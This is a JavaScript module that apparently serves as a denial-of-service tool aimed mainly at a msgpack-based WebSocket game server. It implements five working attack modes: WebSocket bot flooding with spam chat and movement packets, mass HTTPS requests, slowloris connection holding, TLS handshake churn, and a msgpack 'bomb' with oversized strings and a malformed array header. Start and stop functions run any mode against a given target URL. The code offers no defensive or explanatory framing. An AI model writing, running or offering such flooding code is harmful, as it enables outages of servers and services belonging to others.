const WebSocket = require('ws');
const msgpack = require('msgpack-lite');
const http = require('http');
const https = require('https');
const net = require('net');
const tls = require('tls');
const { URL } = require('url');

let activeState = null;

function log(...args) {
  console.log(`[${new Date().toISOString()}]`, ...args);
}

function parseTarget(input) {
  if (!input) return null;
  const hasProtocol = input.startsWith('http') || input.startsWith('wss') || input.startsWith('ws');
  const url = hasProtocol ? new URL(input) : new URL(`https://${input}`);
  return {
    hostname: url.hostname,
    port: url.port || 443,
    protocol: url.protocol,
    path: url.pathname + url.search,
    search: url.search,
    raw: input,
  };
}

const attackModes = {
  async ws(target, count = 100) {
    this.connections = new Set();
    let succeeded = 0;

    const spawnPacket = msgpack.encode(['sp', [{ name: 'x', moofoll: 'x', skin: 0 }]]);
    const movePacket = () => msgpack.encode(['9', [Math.random() * Math.PI * 2]]);
    const chatPacket = () => msgpack.encode(['6', 'A'.repeat(200 + Math.floor(Math.random() * 50))]);
    const attackPacket = () => msgpack.encode(['c', [Math.random() * 100, Math.random() * 100]]);

    const connectOne = (i) => new Promise((resolve) => {
      try {
        const ws = new WebSocket(target.raw, {
          rejectUnauthorized: false,
          handshakeTimeout: 8000,
        });
        this.connections.add(ws);

        ws.on('open', () => {
          succeeded++;
          log(`WS#${i} connected (total: ${succeeded})`);
          for (let b = 0; b < 10; b++) {
            try {
              ws.send(spawnPacket);
              ws.send(movePacket());
              ws.send(chatPacket());
              ws.send(attackPacket());
            } catch (e) {}
          }
          const interval = setInterval(() => {
            if (ws.readyState !== WebSocket.OPEN) { clearInterval(interval); return; }
            try {
              ws.send(movePacket());
              ws.send(chatPacket());
              ws.send(attackPacket());
            } catch (e) {}
          }, 10);
          ws._interval = interval;
          resolve(true);
        });

        ws.on('close', (code) => {
          clearInterval(ws._interval);
          this.connections.delete(ws);
          if (code !== 1000) log(`WS#${i} closed code=${code}`);
          resolve(false);
        });
        ws.on('error', (e) => {
          this.connections.delete(ws);
          resolve(false);
        });

        setTimeout(() => {
          if (ws.readyState === WebSocket.CONNECTING) {
            ws.close();
            this.connections.delete(ws);
            resolve(false);
          }
        }, 10000);
      } catch (e) {
        resolve(false);
      }
    });

    const batchSize = 15;
    for (let i = 0; i < count && !this.aborted; i += batchSize) {
      const batch = [];
      for (let j = i; j < Math.min(i + batchSize, count); j++) {
        batch.push(connectOne(j));
      }
      await Promise.all(batch);
      if (!this.aborted && i + batchSize < count) await new Promise(r => setTimeout(r, 300));
    }

    return { connected: succeeded, attempted: count };
  },

  async http(target, count = 1000) {
    this.connections = new Set();
    const agent = new https.Agent({ keepAlive: true, maxSockets: count, rejectUnauthorized: false });

    for (let i = 0; i < count && !this.aborted; i++) {
      const req = https.request({
        agent,
        hostname: target.hostname,
        port: 443,
        path: '/ping/',
        method: 'GET',
        rejectUnauthorized: false,
        headers: { 'User-Agent': 'Mozilla/5.0' },
      });
      req.on('socket', (sock) => {
        this.connections.add(sock);
        sock.on('close', () => this.connections.delete(sock));
      });
      req.on('error', () => {});
      req.end();

      if (i > 0 && i % 100 === 0) await new Promise(r => setTimeout(r, 50));
    }
    return this.connections.size;
  },

  async slowloris(target, count = 200) {
    this.connections = new Set();

    for (let i = 0; i < count && !this.aborted; i++) {
      const sock = tls.connect({
        host: target.hostname,
        port: 443,
        rejectUnauthorized: false,
      }, () => {
        this.connections.add(sock);
        sock.write(`GET /ping/ HTTP/1.1\r\nHost: ${target.hostname}\r\n`);
        const slowTimer = setInterval(() => {
          if (sock.destroyed) { clearInterval(slowTimer); return; }
          sock.write('X-A: 1\r\n');
        }, 15000);
        sock._slowTimer = slowTimer;
      });
      sock.on('close', () => {
        clearInterval(sock._slowTimer);
        this.connections.delete(sock);
      });
      sock.on('error', () => this.connections.delete(sock));
      sock.setTimeout(120000, () => sock.destroy());

      if (i > 0 && i % 25 === 0) await new Promise(r => setTimeout(r, 100));
    }
    return this.connections.size;
  },

  async tcphandshake(target, count = 500) {
    this.connections = new Set();

    for (let i = 0; i < count && !this.aborted; i++) {
      const sock = tls.connect({
        host: target.hostname,
        port: 443,
        rejectUnauthorized: false,
      }, () => {
        this.connections.add(sock);
        sock.write(Buffer.alloc(1 + Math.floor(Math.random() * 256)));
        setTimeout(() => {
          if (!sock.destroyed) sock.destroy();
        }, 100);
      });
      sock.on('close', () => this.connections.delete(sock));
      sock.on('error', () => {});
      sock.setTimeout(5000, () => sock.destroy());

      if (i > 0 && i % 50 === 0) await new Promise(r => setTimeout(r, 50));
    }
    return { attempted: count, connected: this.connections.size };
  },

  async msgpackbomb(target, count = 10) {
    this.connections = new Set();

    const bombPayload = msgpack.encode(['6', 'A'.repeat(100000)]);
    const hugeArray = Buffer.concat([Buffer.from([0xdd, 0xff, 0xff, 0xff, 0xff]), Buffer.alloc(1024)]);

    for (let i = 0; i < count && !this.aborted; i++) {
      try {
        const ws = new WebSocket(target.raw, {
          rejectUnauthorized: false,
          handshakeTimeout: 10000,
        });
        this.connections.add(ws);

        ws.on('open', () => {
          log(`Bomb#${i} connected`);
          for (let j = 0; j < 5; j++) {
            try { ws.send(bombPayload); } catch (e) {}
          }
          try { ws.send(hugeArray); } catch (e) {}
        });

        ws.on('close', () => this.connections.delete(ws));
        ws.on('error', () => this.connections.delete(ws));

        if (i > 1) await new Promise(r => setTimeout(r, 300));
      } catch (e) {
        log(`Bomb#${i} fail:`, e.message);
      }
    }
    return this.connections.size;
  },
};

async function startAttack(mode, targetStr, count) {
  if (activeState) await stopAttack();

  const target = parseTarget(targetStr);
  if (!target) throw new Error('Invalid target URL');

  const modeFn = attackModes[mode];
  if (!modeFn) throw new Error(`Unknown mode: ${mode}. Available: ${Object.keys(attackModes).join(', ')}`);

  const state = { aborted: false };
  activeState = state;

  log(`Starting ${mode} attack on ${target.hostname} x${count}`);

  const result = await modeFn.call(state, target, count);

  return { mode, target: target.hostname, count, result };
}

async function stopAttack() {
  if (!activeState) return false;

  activeState.aborted = true;

  if (activeState.connections) {
    for (const conn of activeState.connections) {
      try {
        if (conn.readyState === WebSocket.OPEN) conn.close();
        if (conn._interval) clearInterval(conn._interval);
        if (conn._slowTimer) clearInterval(conn._slowTimer);
        if (!conn.destroyed) conn.destroy();
      } catch (e) {}
    }
    activeState.connections.clear();
  }

  activeState = null;
  return true;
}

module.exports = { startAttack, stopAttack, attackModes };
